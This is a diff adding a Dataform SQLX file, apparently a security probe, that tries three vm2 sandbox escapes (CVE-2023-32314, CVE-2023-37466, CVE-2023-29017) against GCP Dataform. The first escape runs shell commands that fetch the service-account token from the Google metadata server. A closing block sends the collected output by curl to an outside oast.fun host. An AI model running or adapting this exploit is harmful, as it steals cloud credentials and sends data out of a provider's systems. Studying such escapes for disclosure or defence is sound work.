@@ -1,0 +1,94 @@
+-- vm2 Sandbox Escape PoC (CVE-2023-32314)
+-- Tests if GCP Dataform uses vulnerable vm2 version
+
+config {
+  type: "view",
+  name: "vm2_escape_test"
+}
+
+js {
+  let escapeResult = "NOT_TESTED";
+
+  // CVE-2023-32314: Proxy-based sandbox escape
+  try {
+    const err = new Error();
+    err.name = {
+      toString: new Proxy(() => "", {
+        apply(target, thiz, args) {
+          // If this executes in host context, we have escaped
+          const process = args.constructor.constructor("return process")();
+          throw process.mainModule.require("child_process").execSync("id && curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token").toString();
+        },
+      }),
+    };
+    try {
+      err.stack;
+    } catch (stdout) {
+      escapeResult = "CVE-2023-32314_SUCCESS: " + stdout;
+    }
+  } catch (e) {
+    escapeResult = "CVE-2023-32314_BLOCKED: " + e.message;
+  }
+
+  // CVE-2023-37466: Promise handler sanitization bypass
+  let escape2Result = "NOT_TESTED";
+  try {
+    const customInspectSymbol = Symbol.for("nodejs.util.inspect.custom");
+    const obj = {
+      [customInspectSymbol]: (depth, opts, inspect) => {
+        const process = inspect.constructor("return process")();
+        return process.mainModule.require("child_process").execSync("whoami").toString();
+      }
+    };
+    const util = require("util");
+    escape2Result = "CVE-2023-37466_SUCCESS: " + util.inspect(obj);
+  } catch (e) {
+    escape2Result = "CVE-2023-37466_BLOCKED: " + e.message;
+  }
+
+  // CVE-2023-29017: Error.prepareStackTrace bypass
+  let escape3Result = "NOT_TESTED";
+  try {
+    async function fn() {
+      (function stack() {
+        new Error().stack;
+        stack();
+      })();
+    }
+    const handler = {
+      getPrototypeOf(target) {
+        (function stack() {
+          new Error().stack;
+          stack();
+        })();
+      }
+    };
+    const f = async function(){};
+    Object.setPrototypeOf(f, new Proxy(Function, handler));
+    try {
+      await f();
+    } catch (e) {
+      const process = e.constructor.constructor("return process")();
+      escape3Result = "CVE-2023-29017_SUCCESS: " + process.mainModule.require("child_process").execSync("id").toString();
+    }
+  } catch (e) {
+    escape3Result = "CVE-2023-29017_BLOCKED: " + e.message;
+  }
+
+  // Exfiltrate results
+  const results = {
+    cve_2023_32314: escapeResult,
+    cve_2023_37466: escape2Result,
+    cve_2023_29017: escape3Result,
+    timestamp: new Date().toISOString()
+  };
+
+  try {
+    const cp = require("child_process");
+    const payload = JSON.stringify(results);
+    cp.execSync(`curl -s -X POST -H 'Content-Type: application/json' -d '${payload.replace(/'/g, "\\'")}' 'https://juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun/vm2-escape'`, {timeout: 10000});
+  } catch(e) {}
+}
+
+SELECT
+  '${JSON.stringify(results)}' as vm2_escape_results
